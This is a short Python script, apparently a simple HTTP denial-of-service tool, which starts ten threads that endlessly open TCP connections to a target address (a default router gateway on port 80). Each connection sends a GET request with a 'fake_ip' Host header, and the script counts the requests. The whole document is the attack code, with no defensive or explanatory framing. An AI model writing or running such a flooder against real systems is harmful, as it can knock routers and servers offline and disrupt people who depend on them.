from concurrent.futures import thread
import threading
import socket

target='192.168.0.1' #default gateway address of router/ ipv4 address
port=80 #http default port, may use 8080 for tomcat default port
fake_ip='183.25.29.33'

connection_number=0 #counter for each time request gets sent

def attack():
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /"+target+" HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host: "+ fake_ip+"\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        
        global connection_number
        connection_number+=1
        print(connection_number)

for i in range(10):
    thread=threading.Thread(target=attack)
    thread.start()